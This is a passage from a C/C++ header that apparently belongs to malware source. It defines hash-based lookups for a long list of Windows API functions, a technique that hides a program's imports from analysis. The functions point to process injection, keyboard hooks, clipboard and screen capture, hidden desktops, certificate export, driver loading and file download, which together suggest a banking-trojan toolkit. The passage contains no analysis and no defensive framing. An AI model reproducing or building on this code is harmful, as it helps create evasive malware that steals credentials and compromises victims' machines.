#define pSetSecurityDescriptorDacl		pushargEx< DLL_ADVAPI32, 0xC6C4A70D, 507 >
#define pSetFileSecurityW		pushargEx< DLL_ADVAPI32, 0x44A631E0, 90 >
#define pRegCreateKeyW		pushargEx< DLL_ADVAPI32, 0x20A23A60, 410 >
#define pRegCreateKeyA		pushargEx< DLL_ADVAPI32, 0x20A23A76, 449 >
#define pRegCreateKeyExW		pushargEx< DLL_ADVAPI32, 0x8E9CEDCD, 10 >
#define pRegCreateKeyExA		pushargEx< DLL_ADVAPI32, 0x8E9CEDDB, 479 >
#define pRegSaveKeyA		pushargEx< DLL_ADVAPI32, 0x3BD4D735, 366 >
#define pRegSaveKeyW		pushargEx< DLL_ADVAPI32, 0x3BD4D723, 343 >
#define pRegSaveKeyExA		pushargEx< DLL_ADVAPI32, 0x35CC2B06, 53 >
#define pRegSaveKeyExW		pushargEx< DLL_ADVAPI32, 0x35CC2B10, 345 >
#define pCryptAcquireContextA		pushargEx< DLL_ADVAPI32, 0x4D58D665, 222 >
#define pCryptReleaseContext		pushargEx< DLL_ADVAPI32, 0xB5F915A9, 52 >
#define pCryptCreateHash		pushargEx< DLL_ADVAPI32, 0x2271985D, 452 >
#define pCryptGenKey		pushargEx< DLL_ADVAPI32, 0xA13908CE, 543 >
#define pCryptDeriveKey		pushargEx< DLL_ADVAPI32, 0x296A7D7B, 354 >
#define pCryptDestroyHash		pushargEx< DLL_ADVAPI32, 0xBBC2BA53, 562 >
#define pCryptHashData		pushargEx< DLL_ADVAPI32, 0x760BDB77, 380 >
#define pCryptImportKey		pushargEx< DLL_ADVAPI32, 0x665A754B, 372 >
#define pCryptEncrypt		pushargEx< DLL_ADVAPI32, 0x4BA36B4E, 523 >
#define pCryptDecrypt		pushargEx< DLL_ADVAPI32, 0x4BA36F16, 175 >
#define pCryptSetKeyParam		pushargEx< DLL_ADVAPI32, 0x29982A24, 257 >
#define pCryptDestroyKey		pushargEx< DLL_ADVAPI32, 0x1377477F, 77 >
#define pControlService		pushargEx< DLL_ADVAPI32, 0x41C29B04, 568 >
#define pQueryServiceStatus		pushargEx< DLL_ADVAPI32, 0x87BCC521, 455 >
#define pSetServiceStatus		pushargEx< DLL_ADVAPI32, 0x9EFBA97D, 346 >
#define pRegisterServiceCtrlHandlerA		pushargEx< DLL_ADVAPI32, 0x307B4C19, 105 >
#define pStartServiceCtrlDispatcherA		pushargEx< DLL_ADVAPI32, 0x3D9F0053, 14 >
#define pQueryServiceStatusEx		pushargEx< DLL_ADVAPI32, 0x31481AA5, 488 >
#define pRegDeleteValueA		pushargEx< DLL_ADVAPI32, 0x48300677, 278 >
#define pCloseServiceHandle		pushargEx< DLL_ADVAPI32, 0x3F41DD6A, 64 >
#define pAllocateAndInitializeSid		pushargEx< DLL_ADVAPI32, 0x22FDCBA6, 536 >
#define pCheckTokenMembership		pushargEx< DLL_ADVAPI32, 0x4071D301, 134 >
#define pFreeSid		pushargEx< DLL_ADVAPI32, 0x6ADBFB5B, 113 >

#pragma endregion

// user32
#pragma region user32

#define pExitWindowsEx		pushargEx< DLL_USER32, 0x234C3B54, 500 >
#define pPeekMessageW		pushargEx< DLL_USER32, 0x52B404CA, 48 >
#define pDispatchMessageW		pushargEx< DLL_USER32, 0x5593CFE3, 263 >
#define pMsgWaitForMultipleObjects		pushargEx< DLL_USER32, 0xD97871C7, 438 >
#define pWaitForInputIdle		pushargEx< DLL_USER32, 0x51919F89, 225 >
#define pGetWindowThreadProcessId		pushargEx< DLL_USER32, 0x666B5858, 323 >
#define pFindWindowA		pushargEx< DLL_USER32, 0x87588DCB, 415 >
#define pGetSystemMetrics		pushargEx< DLL_USER32, 0x9083EB8C, 130 >
#define pGetActiveWindow		pushargEx< DLL_USER32, 0xC540E291, 203 >
#define pGetKeyboardLayoutNameA		pushargEx< DLL_USER32, 0x281B8529, 402 >
#define pOpenClipboard		pushargEx< DLL_USER32, 0xE4E3BF65, 199 >
#define pGetClipboardData		pushargEx< DLL_USER32, 0x9047F625, 542 >
#define pCloseClipboard		pushargEx< DLL_USER32, 0xEED05AE7, 83 >
#define pGetWindowTextA		pushargEx< DLL_USER32, 0x821568FF, 352 >
#define pGetWindowTextW		pushargEx< DLL_USER32, 0x821568E9, 522 >
#define pGetForegroundWindow		pushargEx< DLL_USER32, 0xCB23CA41, 508 >
#define pGetWindowLongPtrA		pushargEx< DLL_USER32, 0x2DD18AEF, 416 >
#define pGetWindowLongPtrW		pushargEx< DLL_USER32, 0x2DD18AF9, 208 >
#define pEnumChildWindows		pushargEx< DLL_USER32, 0xB0B74B0F, 132 >
#define pGetParent		pushargEx< DLL_USER32, 0xDC98B1DB, 210 >
#define pGetDesktopWindow		pushargEx< DLL_USER32, 0xD377D816, 518 >
#define pIsWindowVisible		pushargEx< DLL_USER32, 0xD196AD82, 514 >
#define pIsWindowUnicode		pushargEx< DLL_USER32, 0x70D5E5BB, 476 >
#define pSetWindowLongA		pushargEx< DLL_USER32, 0xA350E17E, 101 >
#define pSetWindowLongW		pushargEx< DLL_USER32, 0xA350E168, 321 >
#define pGetWindowLongA		pushargEx< DLL_USER32, 0x0350E17E, 152 >
#define pGetWindowLongW		pushargEx< DLL_USER32, 0x0350E168, 434 >
#define pSetLayeredWindowAttributes		pushargEx< DLL_USER32, 0x27964998, 184 >
#define pSetWindowPos		pushargEx< DLL_USER32, 0x2C318D5F, 112 >
#define pMessageBoxA		pushargEx< DLL_USER32, 0x2EB650FD, 291 >
#define pMessageBoxW		pushargEx< DLL_USER32, 0x2EB650EB, 302 >
#define pGetClassNameW		pushargEx< DLL_USER32, 0x8AB8789A, 548 >
#define pGetClassNameA		pushargEx< DLL_USER32, 0x8AB8788C, 516 >
#define pShowWindow		pushargEx< DLL_USER32, 0xF00CFD10, 327 >
#define pSendMessageW		pushargEx< DLL_USER32, 0xDDB464CF, 554 >
#define pSendMessageA		pushargEx< DLL_USER32, 0xDDB464D9, 200 >
#define pEnumWindows		pushargEx< DLL_USER32, 0x1C4A8D3A, 195 >
#define pIsWindow		pushargEx< DLL_USER32, 0xAA40ED60, 32 >
#define pGetWindow		pushargEx< DLL_USER32, 0x5F18F160, 74 >
#define pCreateDesktopW		pushargEx< DLL_USER32, 0xDA02AF44, 429 >
#define pCreateDesktopA		pushargEx< DLL_USER32, 0xDA02AF52, 180 >
#define pGetThreadDesktop		pushargEx< DLL_USER32, 0x67C4A9C7, 392 >
#define pSwitchDesktop		pushargEx< DLL_USER32, 0xD5AEA655, 470 >
#define pSetThreadDesktop		pushargEx< DLL_USER32, 0x67C481C7, 492 >
#define pGetTopWindow		pushargEx< DLL_USER32, 0x4C1274C3, 300 >
#define pMoveWindow		pushargEx< DLL_USER32, 0xF73EB51F, 84 >
#define pFindWindowExA		pushargEx< DLL_USER32, 0x23738425, 138 >
#define pGetMessageA		pushargEx< DLL_USER32, 0x4DA84C5C, 473 >
#define pSendMessageTimeoutW		pushargEx< DLL_USER32, 0xA20B7278, 246 >
#define pSendMessageTimeoutA		pushargEx< DLL_USER32, 0xA20B726E, 193 >
#define pSetClipboardViewer		pushargEx< DLL_USER32, 0x75AC8FC1, 311 >
#define pIsClipboardFormatAvailable		pushargEx< DLL_USER32, 0xBB2C24A1, 381 >
#define pChangeClipboardChain		pushargEx< DLL_USER32, 0xBB774C46, 369 >
#define pPostMessageA		pushargEx< DLL_USER32, 0x4DB40657, 155 >
#define pGetMessagePos		pushargEx< DLL_USER32, 0x13133D2B, 232 >
#define pClientToScreen		pushargEx< DLL_USER32, 0x4A018DF0, 525 >
#define pGetWindowRect		pushargEx< DLL_USER32, 0x19C42750, 95 >
#define pDefWindowProcA		pushargEx< DLL_USER32, 0xD8F2E37F, 241 >
#define pCallWindowProcA		pushargEx< DLL_USER32, 0xF063A0BA, 396 >
#define pGetKeyNameTextW		pushargEx< DLL_USER32, 0xB3088F24, 120 >
#define pGetKeyboardState		pushargEx< DLL_USER32, 0xEBDA9E9B, 119 >
#define pGetKeyboardLayout		pushargEx< DLL_USER32, 0xBE4985CA, 49 >
#define pToUnicodeEx		pushargEx< DLL_USER32, 0xAC4EE821, 144 >
#define pLoadCursorW		pushargEx< DLL_USER32, 0x4AB8DD3F, 527 >
#define pLoadCursorA		pushargEx< DLL_USER32, 0x4AB8DD29, 550 >
#define pRegisterClassA		pushargEx< DLL_USER32, 0xB097B151, 22 >
#define pCreateWindowExA		pushargEx< DLL_USER32, 0xA1428167, 443 >
#define pTranslateMessage		pushargEx< DLL_USER32, 0xDA60880C, 404 >
#define pDispatchMessageA		pushargEx< DLL_USER32, 0x5593CFF5, 177 >
#define pGetWindowDC		pushargEx< DLL_USER32, 0x3C586C37, 521 >
#define pReleaseDC		pushargEx< DLL_USER32, 0xC9B8C544, 279 >
#define pFillRect		pushargEx< DLL_USER32, 0xFDDEC2BB, 143 >
#define pCallWindowProcW		pushargEx< DLL_USER32, 0xF063A0AC, 341 >
#define pSetTimer		pushargEx< DLL_USER32, 0x7A96F17E, 5 >
#define pDestroyWindow		pushargEx< DLL_USER32, 0x65761543, 419 >
#define pGetFocus		pushargEx< DLL_USER32, 0x5A7D797E, 66 >
#define pCharLowerBuffA		pushargEx< DLL_USER32, 0x41E66084, 69 >
#define pCharLowerBuffW		pushargEx< DLL_USER32, 0x41E66092, 432 >
#define pCharUpperBuffA		pushargEx< DLL_USER32, 0xDEE86088, 221 >
#define pCharUpperBuffW		pushargEx< DLL_USER32, 0xDEE8609E, 82 >
#define pwvsprintfA		pushargEx< DLL_USER32, 0xEE30E49C, 336 >
#define pwvsprintfW		pushargEx< DLL_USER32, 0xEE30E48A, 297 >
#define pSetWindowsHookExA		pushargEx< DLL_USER32, 0xAAD753E7, 25 >
#define pSetWindowsHookExW		pushargEx< DLL_USER32, 0xAAD753F1, 388 >
#define pUnhookWindowsHookEx		pushargEx< DLL_USER32, 0x7F8FD6B7, 541 >
#define pSetWindowTextA		pushargEx< DLL_USER32, 0x221568FF, 412 >
#define pSetWindowTextW		pushargEx< DLL_USER32, 0x221568E9, 218 >
#define pSetWindowLongPtrA		pushargEx< DLL_USER32, 0x2DC58AEF, 418 >
#define pSetWindowLongPtrW		pushargEx< DLL_USER32, 0x2DC58AF9, 414 >
#define pScreenToClient		pushargEx< DLL_USER32, 0xA392E8EF, 493 >
#define pGetClientRect		pushargEx< DLL_USER32, 0x2CCA2352, 212 >
#define pGetDlgItem		pushargEx< DLL_USER32, 0x19DE35D8, 7 >
#define pCallNextHookEx		pushargEx< DLL_USER32, 0x982AD36E, 100 >
#define pGetCursor		pushargEx< DLL_USER32, 0x9C9D31C4, 357 >
#define pSetCursor		pushargEx< DLL_USER32, 0x889D31C4, 547 >
#define pGetAncestor		pushargEx< DLL_USER32, 0x2FF4A5EE, 450 >
#define pRegisterWindowMessageA		pushargEx< DLL_USER32, 0xCC490308, 451 >
#define pGetDC		pushargEx< DLL_USER32, 0x4AD1FBFE, 329 >
#define pGetClassLongA		pushargEx< DLL_USER32, 0xAB78B98C, 299 >
#define pPrintWindow		pushargEx< DLL_USER32, 0x710EC980, 403 >
#define pGetWindowPlacement		pushargEx< DLL_USER32, 0xA7E69CF3, 498 >
#define pIsIconic		pushargEx< DLL_USER32, 0x0A626E84, 262 >
#define pSetFocus		pushargEx< DLL_USER32, 0x5A55797E, 421 >
#define pSetActiveWindow		pushargEx< DLL_USER32, 0xC540E2C1, 30 >
#define pSetCursorPos		pushargEx< DLL_USER32, 0x38A9FDE7, 3 >
#define pAttachThreadInput		pushargEx< DLL_USER32, 0xFFE45F0A, 121 >
#define pUpdateWindow		pushargEx< DLL_USER32, 0x7926658B, 282 >
#define pDestroyMenu		pushargEx< DLL_USER32, 0xEF5A95C8, 164 >
#define pmouse_event		pushargEx< DLL_USER32, 0x2E34C20D, 391 >
#define pSetCapture		pushargEx< DLL_USER32, 0x6E7E6233, 117 >
#define pReleaseCapture		pushargEx< DLL_USER32, 0x753797ED, 386 >
#define pBlockInput		pushargEx< DLL_USER32, 0x7409A1F9, 166 >
#define pSendInput		pushargEx< DLL_USER32, 0x4B1D95F9, 347 >
#define pEnumThreadWindows		pushargEx< DLL_USER32, 0x7ED57BE5, 420 >
#define pIsWindowEnabled		pushargEx< DLL_USER32, 0xF0F5653A, 70 >
#define pSendNotifyMessageA		pushargEx< DLL_USER32, 0x5D363C82, 376 >

#pragma endregion

// winsock
#pragma region winsock

#define pWSACleanup		pushargEx< DLL_WINSOCK, 0x0AB2A1CD, 545 >
#define pWSAStartup		pushargEx< DLL_WINSOCK, 0x48D4610D, 129 >
#define psocket		pushargEx< DLL_WINSOCK, 0xCA162D43, 92 >
#define pclosesocket		pushargEx< DLL_WINSOCK, 0x1697456C, 276 >
#define paccept		pushargEx< DLL_WINSOCK, 0x0A15A753, 269 >
#define pbind		pushargEx< DLL_WINSOCK, 0x1A36AED6, 272 >
#define phtons		pushargEx< DLL_WINSOCK, 0xB8F72ECC, 430 >
#define plisten		pushargEx< DLL_WINSOCK, 0xA811EDA1, 204 >
#define precv		pushargEx< DLL_WINSOCK, 0x1835A844, 474 >
#define psend		pushargEx< DLL_WINSOCK, 0x1815AED6, 365 >
#define pconnect		pushargEx< DLL_WINSOCK, 0xDBB6EAA3, 320 >
#define pshutdown		pushargEx< DLL_WINSOCK, 0x7B764C68, 506 >
#define pgethostbyname		pushargEx< DLL_WINSOCK, 0x7A7F6036, 29 >
#define pgethostbyaddr		pushargEx< DLL_WINSOCK, 0x7B9E24A1, 303 >
#define pinet_addr		pushargEx< DLL_WINSOCK, 0x10EEB1FE, 171 >
#define pinet_ntoa		pushargEx< DLL_WINSOCK, 0x110AB46D, 549 >
#define pgetaddrinfo		pushargEx< DLL_WINSOCK, 0x5CF2014A, 431 >
#define pgetpeername		pushargEx< DLL_WINSOCK, 0x5C33C0C8, 467 >
#define pselect		pushargEx< DLL_WINSOCK, 0x6BF5AE43, 339 >
#define psetsockopt		pushargEx< DLL_WINSOCK, 0x5D982343, 411 >
#define pWSAGetLastError		pushargEx< DLL_WINSOCK, 0x90BBFA4F, 385 >
#define pWSASetLastError		pushargEx< DLL_WINSOCK, 0x90B97A4F, 102 >
#define pioctlsocket		pushargEx< DLL_WINSOCK, 0x9A9963ED, 499 >
#define pWSAFDIsSet		pushargEx< DLL_WINSOCK, 0xC8FDFC8B, 42 >

#pragma endregion

// ntdll
#pragma region ntdll

#define pRtlInitUnicodeString		pushargEx< DLL_NTDLL, 0xF508E422, 72 >
#define pRtlInitAnsiString		pushargEx< DLL_NTDLL, 0xF08D1B57, 115 >
#define pNtOpenFile		pushargEx< DLL_NTDLL, 0x194FA11C, 211 >
#define pNtOpenDirectoryObject		pushargEx< DLL_NTDLL, 0x327534A1, 436 >
#define pNtCreateSection		pushargEx< DLL_NTDLL, 0x70531AB6, 284 >
#define pNtOpenSection		pushargEx< DLL_NTDLL, 0xD195D3C8, 324 >
#define pZwLoadDriver		pushargEx< DLL_NTDLL, 0xC7E905C3, 194 >
#define pZwUnloadDriver		pushargEx< DLL_NTDLL, 0x8BB8E394, 559 >
#define pRtlAdjustPrivilege		pushargEx< DLL_NTDLL, 0x8529AF93, 196 >
#define pZwMakeTemporaryObject		pushargEx< DLL_NTDLL, 0xD508C182, 63 >
#define pNtClose		pushargEx< DLL_NTDLL, 0x0BF4D668, 482 >
#define pRtlImageNtHeader		pushargEx< DLL_NTDLL, 0xC304E329, 79 >
#define pZwQuerySystemInformation		pushargEx< DLL_NTDLL, 0xB6508806, 552 >
#define pZwUnmapViewOfSection		pushargEx< DLL_NTDLL, 0x595BD930, 454 >
#define pZwMapViewOfSection		pushargEx< DLL_NTDLL, 0x1EC28401, 127 >
#define pZwQueueApcThread		pushargEx< DLL_NTDLL, 0xDED9E8D3, 40 >
#define pZwResumeThread		pushargEx< DLL_NTDLL, 0xB2C4C7CC, 535 >
#define pZwTestAlert		pushargEx< DLL_NTDLL, 0x4C58989B, 151 >
#define pZwQueryInformationThread		pushargEx< DLL_NTDLL, 0xF0F9DA9D, 2 >
#define pZwOpenProcess		pushargEx< DLL_NTDLL, 0x1236B16D, 424 >
#define pZwOpenProcessToken		pushargEx< DLL_NTDLL, 0xEA23A03A, 96 >
#define pZwClose		pushargEx< DLL_NTDLL, 0x0BF48670, 307 >
#define pZwAllocateVirtualMemory		pushargEx< DLL_NTDLL, 0x535E81B7, 258 >
#define pZwFreeVirtualMemory		pushargEx< DLL_NTDLL, 0x795C8C3D, 19 >
#define pZwWriteVirtualMemory		pushargEx< DLL_NTDLL, 0x2968A772, 373 >
#define pZwProtectVirtualMemory		pushargEx< DLL_NTDLL, 0xFA22EE6F, 197 >
#define pRtlCreateUserThread		pushargEx< DLL_NTDLL, 0x2E6FBAE6, 309 >
#define pLdrLoadDll		pushargEx< DLL_NTDLL, 0xFD7E1144, 360 >
#define pLdrGetDllHandle		pushargEx< DLL_NTDLL, 0x60140657, 149 >
#define pLdrGetProcedureAddress		pushargEx< DLL_NTDLL, 0xF0280024, 98 >
#define pZwSetContextThread		pushargEx< DLL_NTDLL, 0x256DE052, 108 >
#define pZwSetInformationProcess		pushargEx< DLL_NTDLL, 0xC03FDE01, 540 >
#define pZwQueryInformationProcess		pushargEx< DLL_NTDLL, 0xAC2C5568, 190 >
#define pRtlImageDirectoryEntryToData		pushargEx< DLL_NTDLL, 0x36F2E009, 65 >
#define pZwQueryInformationFile		pushargEx< DLL_NTDLL, 0xCD6F8CE6, 423 >
#define pZwShutdownSystem		pushargEx< DLL_NTDLL, 0x71219EA3, 61 >
#define pRtlComputeCrc32		pushargEx< DLL_NTDLL, 0x76470A1E, 46 >
#define pNtQuerySystemInformation		pushargEx< DLL_NTDLL, 0xBA50882E, 39 >
#define pNtDeviceIoControlFile		pushargEx< DLL_NTDLL, 0xFFD858A3, 107 >
#define pNtMapViewOfSection		pushargEx< DLL_NTDLL, 0x14C18401, 382 >
#define pNtUnmapViewOfSection		pushargEx< DLL_NTDLL, 0x995BDBB0, 466 >

#pragma endregion

// winsta
#pragma region winsta

#define pWinStationTerminateProcess		pushargEx< DLL_WINSTA, 0xAC41C432, 292 >

#pragma endregion

// shell32
#pragma region shell32

#define pSHGetSpecialFolderPathA		pushargEx< DLL_SHELL32, 0xC349AD03, 231 >
#define pSHGetSpecialFolderPathW		pushargEx< DLL_SHELL32, 0xC349AD15, 146 >
#define pFindExecutableA		pushargEx< DLL_SHELL32, 0x294C0F3D, 379 >
#define pFindExecutableW		pushargEx< DLL_SHELL32, 0x294C0F2B, 125 >
#define pSHGetFolderPathA		pushargEx< DLL_SHELL32, 0xC0978B7C, 457 >
#define pSHGetFolderPathW		pushargEx< DLL_SHELL32, 0xC0978B6A, 153 >
#define pShellExecuteW		pushargEx< DLL_SHELL32, 0xD937B07F, 168 >
#define pShellExecuteA		pushargEx< DLL_SHELL32, 0xD937B069, 186 >
#define pStrStrIW		pushargEx< DLL_SHELL32, 0x0931636B, 252 >
#define pStrStrIA		pushargEx< DLL_SHELL32, 0x0931637D, 57 >
#define pShellExecuteExA		pushargEx< DLL_SHELL32, 0xEC1B13BE, 94 >
#define pShellExecuteExW		pushargEx< DLL_SHELL32, 0xEC1B13A8, 322 >
#define pSHFileOperationA		pushargEx< DLL_SHELL32, 0x95501C36, 248 >
#define pSHFileOperationW		pushargEx< DLL_SHELL32, 0x95501C20, 513 >
#define pSHCreateDirectoryExA		pushargEx< DLL_SHELL32, 0x0AD3FCE3, 99 >
#define pSHCreateDirectoryExW		pushargEx< DLL_SHELL32, 0x0AD3FCF5, 244 >

#pragma endregion

// wininet
#pragma region wininet

#define pInternetConnectA		pushargEx< DLL_WININET, 0xA05C9303, 236 >
#define pInternetConnectW		pushargEx< DLL_WININET, 0xA05C9315, 271 >
#define pHttpOpenRequestA		pushargEx< DLL_WININET, 0x0B2D1E12, 228 >
#define pHttpOpenRequestW		pushargEx< DLL_WININET, 0x0B2D1E04, 417 >
#define pHttpSendRequestA		pushargEx< DLL_WININET, 0x812E9B57, 172 >
#define pHttpSendRequestW		pushargEx< DLL_WININET, 0x812E9B41, 128 >
#define pInternetCloseHandle		pushargEx< DLL_WININET, 0xB49BE51D, 314 >
#define pInternetQueryOptionA		pushargEx< DLL_WININET, 0xED681165, 293 >
#define pInternetQueryOptionW		pushargEx< DLL_WININET, 0xED681173, 447 >
#define pInternetSetOptionA		pushargEx< DLL_WININET, 0x5D5F8245, 91 >
#define pInternetSetStatusCallback		pushargEx< DLL_WININET, 0x03FBFF56, 524 >
#define pHttpQueryInfoA		pushargEx< DLL_WININET, 0x316098D2, 364 >
#define pHttpQueryInfoW		pushargEx< DLL_WININET, 0x316098C4, 111 >
#define pHttpAddRequestHeadersA		pushargEx< DLL_WININET, 0x77843830, 18 >
#define pHttpAddRequestHeadersW		pushargEx< DLL_WININET, 0x77843826, 87 >
#define pGetUrlCacheEntryInfoW		pushargEx< DLL_WININET, 0x907FE89A, 471 >
#define pGetUrlCacheEntryInfoA		pushargEx< DLL_WININET, 0x907FE88C, 224 >
#define pFindFirstUrlCacheEntryA		pushargEx< DLL_WININET, 0x07C8990E, 75 >
#define pFindNextUrlCacheEntryA		pushargEx< DLL_WININET, 0x4527FE45, 233 >
#define pDeleteUrlCacheEntry		pushargEx< DLL_WININET, 0x642714A7, 206 >
#define pFindCloseUrlCache		pushargEx< DLL_WININET, 0xE367697E, 520 >
#define pInternetOpenA		pushargEx< DLL_WININET, 0x86654527, 116 >
#define pInternetOpenUrlA		pushargEx< DLL_WININET, 0xA640A35B, 45 >
#define pInternetReadFile		pushargEx< DLL_WININET, 0x041C375F, 328 >
#define pInternetReadFileExA		pushargEx< DLL_WININET, 0xEBDD2675, 226 >
#define pInternetReadFileExW		pushargEx< DLL_WININET, 0xEBDD2663, 106 >
#define pReadUrlCacheEntryStream		pushargEx< DLL_WININET, 0x1C669445, 349 >
#define pUnlockUrlCacheEntryStream		pushargEx< DLL_WININET, 0xE436531D, 174 >
#define pRetrieveUrlCacheEntryStreamA		pushargEx< DLL_WININET, 0x0651F217, 539 >
#define pFindFirstUrlCacheEntryExA		pushargEx< DLL_WININET, 0x2642E401, 551 >
#define pFindNextUrlCacheEntryExA		pushargEx< DLL_WININET, 0xFF9034BA, 537 >
#define pDeleteUrlCacheEntryA		pushargEx< DLL_WININET, 0x138A5341, 8 >
#define pCreateUrlCacheEntryA		pushargEx< DLL_WININET, 0xD70E53A4, 546 >
#define pCommitUrlCacheEntryA		pushargEx< DLL_WININET, 0x930269E7, 43 >

#pragma endregion

// urlmon
#pragma region urlmon

#define pURLDownloadToFileA		pushargEx< DLL_URLMON, 0x9ED23DA4, 36 >
#define pURLDownloadToFileW		pushargEx< DLL_URLMON, 0x9ED23DB2, 54 >
#define pObtainUserAgentString		pushargEx< DLL_URLMON, 0xC2B0FCD0, 213 >

#pragma endregion

// gdi
#pragma region gdi

#define pCreateCompatibleBitmap		pushargEx< DLL_GDI, 0xA9205884, 255 >
#define pCreateCompatibleDC		pushargEx< DLL_GDI, 0x1D7F1F41, 50 >
#define pSelectObject		pushargEx< DLL_GDI, 0xCD88A20C, 0 >
#define pBitBlt		pushargEx< DLL_GDI, 0xA8FC684B, 275 >
#define pDeleteDC		pushargEx< DLL_GDI, 0x691AE10C, 6 >
#define pDeleteObject		pushargEx< DLL_GDI, 0xCDA4060C, 501 >
#define pGetDeviceCaps		pushargEx< DLL_GDI, 0xB7D51ABF, 260 >
#define pCreateSolidBrush		pushargEx< DLL_GDI, 0xF1A7DE53, 243 >

#pragma endregion

// gdiplus
#pragma region gdiplus

#define pGdiplusStartup		pushargEx< DLL_GDIPLUS, 0x4BCB3197, 242 >
#define pGdipCreateBitmapFromHBITMAP		pushargEx< DLL_GDIPLUS, 0x913D2E45, 26 >
#define pGdipSaveImageToFile		pushargEx< DLL_GDIPLUS, 0x239FADFA, 433 >
#define pGdipDisposeImage		pushargEx< DLL_GDIPLUS, 0x3C52B71E, 510 >
#define pGdiplusShutdown		pushargEx< DLL_GDIPLUS, 0x879E3859, 71 >

#pragma endregion

// crypt32
#pragma region crypt32

#define pCertOpenSystemStoreA		pushargEx< DLL_CRYPT32, 0x2926E5CC, 530 >
#define pCertEnumCertificatesInStore		pushargEx< DLL_CRYPT32, 0xBE5A7BA3, 313 >
#define pPFXExportCertStoreEx		pushargEx< DLL_CRYPT32, 0x18544E2F, 47 >
#define pCertCloseStore		pushargEx< DLL_CRYPT32, 0xD226139E, 198 >
#define pPFXImportCertStore		pushargEx< DLL_CRYPT32, 0x7D946160, 464 >
#define pCertAddCertificateContextToStore		pushargEx< DLL_CRYPT32, 0xDC6DD6E5, 496 >
#define pCertDuplicateCertificateContext		pushargEx< DLL_CRYPT32, 0x66F16F46, 337 >
#define pCertDeleteCertificateFromStore		pushargEx< DLL_CRYPT32, 0x63788B5E, 393 >

#pragma endregion

// cryptdll
#pragma region cryptdll

#define pMD5Init		pushargEx< DLL_CRYPTDLL, 0x6F5496FE, 326 >
#define pMD5Update		pushargEx< DLL_CRYPTDLL, 0xC41AB8E3, 566 >
#define pMD5Final		pushargEx< DLL_CRYPTDLL, 0x5AAAB569, 59 >

#pragma endregion

// psapi
#pragma region psapi

#define pGetMappedFileNameA		pushargEx< DLL_PSAPI, 0xC18C2F95, 515 >
#define pEnumProcessModules		pushargEx< DLL_PSAPI, 0x5F1008F4, 504 >
#define pGetModuleBaseNameA		pushargEx< DLL_PSAPI, 0x34DCF1D5, 315 >
#define pGetModuleFileNameExA		pushargEx< DLL_PSAPI, 0x237429C0, 234 >
#define pGetProcessImageFileNameA		pushargEx< DLL_PSAPI, 0x08603832, 375 >

#pragma endregion

// shlwapi
#pragma region shlwapi

#define pPathFindFileNameA		pushargEx< DLL_SHLWAPI, 0xF05A27B1, 163 >
#define pPathFindFileNameW		pushargEx< DLL_SHLWAPI, 0xF05A27A7, 390 >
#define pPathCombineA		pushargEx< DLL_SHLWAPI, 0xC0AA6D25, 109 >
#define pPathCombineW		pushargEx< DLL_SHLWAPI, 0xC0AA6D33, 285 >
#define pStrStrA		pushargEx< DLL_SHLWAPI, 0x1C1262CF, 362 >
#define pPathRemoveFileSpecA		pushargEx< DLL_SHLWAPI, 0x216CF010, 312 >
#define pStrToIntA		pushargEx< DLL_SHLWAPI, 0x2FD864CE, 12 >
#define pStrToInt64ExA		pushargEx< DLL_SHLWAPI, 0x820023B8, 68 >
#define pPathAppendA		pushargEx< DLL_SHLWAPI, 0x7D609906, 44 >
#define pPathAppendW		pushargEx< DLL_SHLWAPI, 0x7D609910, 181 >
#define pPathIsDirectoryEmptyA		pushargEx< DLL_SHLWAPI, 0x0D1CA16A, 319 >
#define pPathStripPathA		pushargEx< DLL_SHLWAPI, 0x60FA711A, 435 >
#define pPathFindExtensionA		pushargEx< DLL_SHLWAPI, 0x9CA14E8B, 88 >
#define pPathFindExtensionW		pushargEx< DLL_SHLWAPI, 0x9CA14E9D, 150 >

#pragma endregion

// Iphlpapi
#pragma region Iphlpapi

#define pGetIpNetTable		pushargEx< DLL_IPHLPAPI, 0x36E5E414, 485 >
#define pGetAdaptersInfo		pushargEx< DLL_IPHLPAPI, 0xF8A666EA, 483 >

#pragma endregion

// odbc32
#pragma region odbc32

#define pSQLAllocHandle		pushargEx< DLL_ODBC32, 0xF22350A2, 264 >
#define pSQLSetEnvAttr		pushargEx< DLL_ODBC32, 0x06D266DC, 1 >
#define pSQLConnectA		pushargEx< DLL_ODBC32, 0xA535692F, 503 >
#define pSQLDriverConnectA		pushargEx< DLL_ODBC32, 0x27CEC58A, 318 >
#define pSQLPrepareA		pushargEx< DLL_ODBC32, 0x459755F6, 76 >
#define pSQLBindCol		pushargEx< DLL_ODBC32, 0xB803E8FB, 273 >
#define pSQLExecute		pushargEx< DLL_ODBC32, 0x08EE79FA, 538 >
#define pSQLFetch		pushargEx< DLL_ODBC32, 0x5B1063A5, 229 >
#define pSQLCloseCursor		pushargEx< DLL_ODBC32, 0xB29E89EC, 156 >
#define pSQLFreeHandle		pushargEx< DLL_ODBC32, 0xE414EBF0, 398 >
#define pSQLDisconnect		pushargEx< DLL_ODBC32, 0x0F38B558, 220 >
#define pSQLBindParameter		pushargEx< DLL_ODBC32, 0xF66E7B35, 458 >
#define pSQLGetDiagRecA		pushargEx< DLL_ODBC32, 0x0DF53FCA, 183 >

#pragma endregion

// version
#pragma region version

#define pGetFileVersionInfoSizeA		pushargEx< DLL_VERSION, 0x8080DF54, 13 >
#define pGetFileVersionInfoA		pushargEx< DLL_VERSION, 0xBD2B426B, 192 >
#define pVerQueryValueA		pushargEx< DLL_VERSION, 0x501AB8FA, 215 >

#pragma endregion

// ole32
#pragma region ole32

#define pCoCreateGuid		pushargEx< DLL_OLE32, 0x2F22F053, 165 >
#define pCoInitialize		pushargEx< DLL_OLE32, 0x765DAD3F, 565 >
#define pCoInitializeEx		pushargEx< DLL_OLE32, 0x6B4FA6DD, 114 >
#define pCoUninitialize		pushargEx< DLL_OLE32, 0xF38F6D68, 374 >
#define pCoCreateInstance		pushargEx< DLL_OLE32, 0x28B92B83, 407 >
#define pCoInitializeSecurity		pushargEx< DLL_OLE32, 0x5681A4E2, 333 >

#pragma endregion

// winspool
#pragma region winspool

#define pAddPrintProvidorA		pushargEx< DLL_WINSPOOL, 0x559DAAE2, 219 >
#define pDeletePrintProvidorA		pushargEx< DLL_WINSPOOL, 0xFAB99413, 502 >

#pragma endregion

// imagehlp
#pragma region imagehlp

#define pCheckSumMappedFile		pushargEx< DLL_IMAGEHLP, 0x9262DB9F, 355 >

#pragma endregion

#pragma endregion




#else

#define KERNEL32_HASH 0x4B1FFE8E
#define GETPROCADDR_HASH 0x1FC0EAEE
#define LOADLIBRARY_HASH 0xC8AC8026

enum TDllId
{

    DLL_KERNEL32 = 1,
